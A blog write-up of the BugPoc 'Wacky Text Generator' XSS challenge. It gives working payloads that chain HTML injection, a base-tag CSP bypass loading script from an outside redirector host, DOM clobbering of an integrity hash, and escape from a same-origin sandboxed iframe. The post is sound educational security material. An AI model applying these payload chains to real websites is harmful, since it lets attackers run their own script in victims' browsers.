---
layout: post
title: "BugPoc XSS Challenge"
tags: [Xss]
comments: true
---

BugPoc XSS Challenge
> I am not the one who solves this challenge quickly. After I got up, I saw that someone had submitted it 9 hours ago. But I learned something and some new thinking from this challenge, so I recorded it.Try to get the reward of the best blog.

### Challenge Details
[![](https://pbs.twimg.com/card_img/1324001987948650505/CVEcs2Rg?format=jpg&name=medium)](https://pbs.twimg.com/card_img/1324001987948650505/CVEcs2Rg?format=jpg&name=medium)
Wacky Text Generator (https://wacky.buggywebsite.com)<br>
Rules: Must alert(origin), must bypass CSP, must work in Chrome, must provide a BugPoC demo

### Solving
#### Step 1 : Found html injection
I first opened the challenge page and checked the source code<br>
[![图片一](https://github.com/Jinone/123/raw/master/_posts/image2/E046A1F2-CC9D-4590-AFAB-429BC8F7C7EC.png "图片一")](https://github.com/Jinone/123/raw/master/_posts/image2/E046A1F2-CC9D-4590-AFAB-429BC8F7C7EC.png "图片一")
Found a page https://wacky.buggywebsite.com/frame.html?param=Hello,%20World!<br>
Manual test parameter<br>
After finding the closed `<title>` tag. Can inject html code
[![](https://github.com/Jinone/123/raw/master/_posts/image2/900507D8-857F-44B4-93A2-52ECE7904D8D.png)](https://github.com/Jinone/123/raw/master/_posts/image2/900507D8-857F-44B4-93A2-52ECE7904D8D.png)
In fact, when I first viewed this page, I first checked the source code of the page, read the js, and then discovered this html injection

#### Step 2 :Bypass CSP
Although we have found html injection, it cannot perform xss
[![](https://github.com/Jinone/123/raw/master/_posts/image2/0F33FFF2-1161-476B-A183-46DD1365582C.png)](https://github.com/Jinone/123/raw/master/_posts/image2/0F33FFF2-1161-476B-A183-46DD1365582C.png)
Because
[![](https://github.com/Jinone/123/raw/master/_posts/image2/226C1B5B-8A9C-4E17-98DD-6F9C6822AA73.png)](https://github.com/Jinone/123/raw/master/_posts/image2/226C1B5B-8A9C-4E17-98DD-6F9C6822AA73.png)
```
content-security-policy: script-src 'nonce-kplddkwaepak' 'strict-dynamic'; frame-src 'self'; object-src 'none';
```
You can use [this](https://csp-evaluator.withgoogle.com/http:// "this") to check csp security
[![](https://github.com/Jinone/123/raw/master/_posts/image2/1D76462E-B4C3-4A56-BFCE-6B37377F507E.png)](https://github.com/Jinone/123/raw/master/_posts/image2/1D76462E-B4C3-4A56-BFCE-6B37377F507E.png)
Missing base-uri allows the injection of base tags. They can be used to set the base URL for all relative (script) URLs to an attacker controlled domain<br>
Just use the previously found html injection to inject `<base href="">`<br>
Since this is a ctf challenge, this may be a breakthrough. (If bugbounty, this may not have any effect).I did find relative (script) injection in the js at the bottom
[![](https://github.com/Jinone/123/raw/master/_posts/image2/5DA4ADF1-7835-4E59-AB24-199FEB759377.png)](https://github.com/Jinone/123/raw/master/_posts/image2/5DA4ADF1-7835-4E59-AB24-199FEB759377.png)
But this has to be judged by `if (window.name =='iframe')`<br>
This site `x-frame-options: SAMEORIGIN` cannot use iframe<br>
But  we can set window.name through window.open()<br>
Such as
```
<script>
window.open("https://wacky.buggywebsite.com/frame.html?param=xss","iframe");
</script>
```
##### First try
```
if (window.name == 'iframe') {
			
			// securely load the frame analytics code
			if (fileIntegrity.value) {
				
				// create a sandboxed iframe
				analyticsFrame = document.createElement('iframe');
				analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
				analyticsFrame.setAttribute('class', 'invisible');
				document.body.appendChild(analyticsFrame);

				// securely add the analytics code into iframe
				script = document.createElement('script');
				script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
				script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
				script.setAttribute('crossorigin', 'anonymous');
				analyticsFrame.contentDocument.body.appendChild(script);
				
			}

		} else {
			document.body.innerHTML = `
			<h1>Error</h1>
			<h2>This page can only be viewed from an iframe.</h2>
			<video width="400" controls>
				<source src="movie.mp4" type="video/mp4">
			</video>`
		}
```
After reading this js, I initially thought it would create an iframe and write a `<script src="files/analytics/js/frame-analytics.js">` in it
[![](https://github.com/Jinone/123/raw/master/_posts/image2/FE25CC6A-0801-45CF-881C-872368008AF1.png)](https://github.com/Jinone/123/raw/master/_posts/image2/FE25CC6A-0801-45CF-881C-872368008AF1.png)
I only need to inject the `<base>` tag, control the base-URL to my own domain , and upload a file `/files/analytics/js/frame-analytics.js`, load my own js.<br>
Use [bugpoc mock](https://bugpoc.com/testers/other/mock "bugpoc mock") to construct POC
[![](https://github.com/Jinone/123/raw/master/_posts/image2/6EB8183A-F2A5-4723-835D-F42A3BF94C5B.png)](https://github.com/Jinone/123/raw/master/_posts/image2/6EB8183A-F2A5-4723-835D-F42A3BF94C5B.png)
Then use  [Flexible Redirector](https://bugpoc.com/testers/other/redir "Flexible Redirector") for 302 redirection
[![](https://github.com/Jinone/123/raw/master/_posts/image2/04EBC976-4EDF-4AC8-BD7D-5BE099123108.png)](https://github.com/Jinone/123/raw/master/_posts/image2/04EBC976-4EDF-4AC8-BD7D-5BE099123108.png)
get https://le8497ljneda.redir.bugpoc.ninja/files/analytics/js/frame-analytics.js content `alert(origin);`<br>
Payload
```
<script>
window.open("https://wacky.buggywebsite.com/frame.html?param=</title><base href='https://le8497ljneda.redir.bugpoc.ninja/'>","iframe");
</script>
```
###### Say no
[![](https://github.com/Jinone/123/raw/master/_posts/image2/EE6AAD95-E078-48FA-BE73-55F3E1C3C692.png)](https://github.com/Jinone/123/raw/master/_posts/image2/EE6AAD95-E078-48FA-BE73-55F3E1C3C692.png)
##### Second
Read this [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity "Subresource Integrity")<br>
This helps me understand what is happening<br>
After that I fell into a dead end,I have been thinking about how to bypass SRI,It took a while.(It seems that need to find a browser vulnerability to solve the problem, so the idea at the time was wrong)<br>
After changing mind, only try to modify the value of `integrity`
```
	<script nonce="lxggbsrloata">
	
		window.fileIntegrity = window.fileIntegrity || {
			'rfc' : ' https://w3c.github.io/webappsec-subresource-integrity/',
			'algorithm' : 'sha256',
			'value' : 'unzMI6SuiNZmTzoOnV4Y9yqAjtSOgiIgyrKvumYRI6E=',
			'creationtime' : 1602687229
		}
	
		// verify we are in an iframe
		if (window.name == 'iframe') {
			
			// securely load the frame analytics code
			if (fileIntegrity.value) {
				
				// create a sandboxed iframe
				analyticsFrame = document.createElement('iframe');
				analyticsFrame.setAttribute('sandbox', 'allow-scripts allow-same-origin');
				analyticsFrame.setAttribute('class', 'invisible');
				document.body.appendChild(analyticsFrame);

				// securely add the analytics code into iframe
				script = document.createElement('script');
				script.setAttribute('src', 'files/analytics/js/frame-analytics.js');
				script.setAttribute('integrity', 'sha256-'+fileIntegrity.value);
				script.setAttribute('crossorigin', 'anonymous');
				analyticsFrame.contentDocument.body.appendChild(script);
				
			}

		} else {
			document.body.innerHTML = `
			<h1>Error</h1>
			<h2>This page can only be viewed from an iframe.</h2>
			<video width="400" controls>
				<source src="movie.mp4" type="video/mp4">
			</video>`
		}
		
	</script>
```
To modify the value of `integrity` first,  must modify `fileIntegrity.value`.<br>

`window.fileIntegrity = window.fileIntegrity || {...}`<br>
Seeing this, I thought that as long as I created a `window.fileIntegrity` using the previously discovered html injection,  could change the `fileIntegrity.value`<br>
Because js is a "accommodating" language.For example,  `name` of `iframe`, `id` of `input`. In the unoccupied case, it will change from assignment to dom selector, so it can be used to hijack regular parameters (value href name id src ref..)<br>
`<input id='fileIntegrity'  value='w7eu4SGHdqamrZE5Wi%2bayP8t7tuSBLDdoq4DQUxSpL8='>`   modify `fileIntegrity.value`<br>
Payload
```
<script>
window.open("https://wacky.buggywebsite.com/frame.html?param=</title><input id='fileIntegrity' value='aErQrfRCGgdInIpMEDCWj2%2bHQUab648smjdgPAUdBKU='><base href='https://le8497ljneda.redir.bugpoc.ninja/'>","iframe");
</script>
```
###### Say no again
[![](https://github.com/Jinone/123/raw/master/_posts/image2/E3DE688B-930C-46E4-8C59-58781D64DCE5.png)](https://github.com/Jinone/123/raw/master/_posts/image2/E3DE688B-930C-46E4-8C59-58781D64DCE5.png)
`<iframe sandbox="allow-scripts allow-same-origin" class="invisible"></iframe>`<br>
But the security of using `allow-scripts` `allow-same-origin` at the same time is very low<br>
Because can manipulate the parent window.Just use the alert() of the parent window<br>
Modify the content of `/files/analytics/js/frame-analytics.js` to `window.parent.alert(origin);`<br>

###### Final Payload
```
<script>
window.open("https://wacky.buggywebsite.com/frame.html?param=</title><input id='fileIntegrity' value='w7eu4SGHdqamrZE5Wi%2bayP8t7tuSBLDdoq4DQUxSpL8='><base href='https://960ejm5yq2xy.redir.bugpoc.ninja/'>","iframe");
</script>
```
[![](https://github.com/Jinone/123/raw/master/_posts/image2/E380C034-C25C-4BE0-A826-BAF8B65CCD40.png)](https://github.com/Jinone/123/raw/master/_posts/image2/E380C034-C25C-4BE0-A826-BAF8B65CCD40.png)

### Conclusion
Sorry for my poor English<br>
In order for everyone to understand, the article is written in detail<br>
Although this challenge is simple, it does show that sometimes changing the way of thinking can make the problem very easy<br>
If you have any questions, welcome dm me([jinonehk](https://twitter.com/jinonehk "jinonehk"))
